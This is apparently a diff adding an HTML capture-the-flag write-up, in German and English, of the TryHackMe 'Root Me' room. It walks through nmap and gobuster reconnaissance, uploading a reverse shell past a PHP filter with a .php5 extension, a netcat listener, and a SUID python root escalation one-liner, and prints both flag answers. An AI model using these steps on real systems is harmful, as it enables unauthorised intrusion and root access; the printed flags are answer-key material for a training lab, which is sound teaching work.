@@ -1,0 +1,180 @@
+<html>
+	<head>
+		<title>Root Me</title>
+		<link rel="stylesheet" href="styles.css">
+	</head>
+	<h1>Tryhackme.com - Root Me</h1>
+	<h3>Author: Uwe Hörber Datum: 23.09.2021</h3>
+
+<br>
+
+<br>
+	<h1>the tasks</h1>
+
+<br>
+	<h3> Task 1 </h3>
+	Deploy the machine 
+<br>
+	done
+<br>
+	
+<br>
+	<h3> Task 2 </h3>
+	Reconnaissance
+<br>
+
+<br>
+	<p>
+		mkdir nmap
+<br>
+		nmap -sC -sV -v 10.10.125.248 -o nmap/initial.nmap
+<br>
+	</p>
+
+<br>
+	Scan the macine, how many ports are open?
+<br>
+	2
+<br>
+
+<br>
+	What version of Apache is running?
+<br>
+	2.4.29
+<br>
+
+<br>
+	What service is running on port 22?
+<br>
+	ssh
+<br>
+
+<br>
+	Find directories on the web server using the GoBuster tool.
+<br>
+	<p>
+		gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --url 10.10.125.248
+<br>
+	</p>
+
+<br>
+
+<br>
+	What is the hidden directory?
+<br>
+	/panel/
+<br>
+
+<br>
+	<h3> Task 3 </h3>
+	Getting a shell
+<br>
+
+<br>
+	die panel Seite lässt uns Dateien hochladen. Wir versuchen es mit einer reverse shell.
+<br>
+
+<br>
+	Wir kopieren uns unsere reverse-shell und passen die IP und Port an.
+<br>
+	IP können wir über 
+<br>
+	<p>ip a s tun0</p>
+	finden.
+<br>
+
+<br>
+	Als Port definieren wir 8001
+<br>
+
+<br>
+	nun laden wir die Datei hoch.
+<br>
+
+<br>
+	es scheint als wäre php nicht erlaubt. es gibt jedoch noch andere Endungen die wir probieren können.
+<br>
+
+<br>
+	In der Tat funktioniert php5 als Endung.
+<br>
+
+<br>
+	Unter dem Endpunkt /uploads sehen wir nun auch unsere reverseshell.
+<br>
+
+<br>
+
+<br>
+	Wir starten nun unseren Listener
+<br>
+
+<br>
+	<p>
+		nc -lnvp 8001
+<br>
+	</p>
+
+<br>
+
+<br>
+	und klicken auf unsere Reverse-shell.
+<br>
+	in /var/www finden wir unsere flag
+<br>
+
+<br>
+	user.txt:
+<br>
+	THM{y0u_g0t_a_sh3ll}
+<br>
+	
+<br>
+	<h3> Task 4 </h3>
+	Privilege escalation
+<br>
+
+<br>
+	Search for files with SUID permission, which file is weird?
+<br>
+
+<br>
+	<p>
+		find / -user root -perm /4000
+<br>
+	</p>
+
+<br>
+	/usr/bin/python sieht interessant aus
+<br>
+
+<br>
+	Find a form to escalate your privileges.
+<br>
+
+<br>
+	gtfobins zeigt uns hier die escalation
+<br>
+
+<br>
+	<p>
+		/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+<br>
+	</p>
+
+<br>
+	nun sind wir root und finden das root flag unter /root/root.txt
+<br>
+
+<br>
+	root.txt:
+<br>
+	THM{pr1v1l3g3_3sc4l4t10n}
+<br>
+
+<br>
+
+<br>
+	
+<br>
+</html>
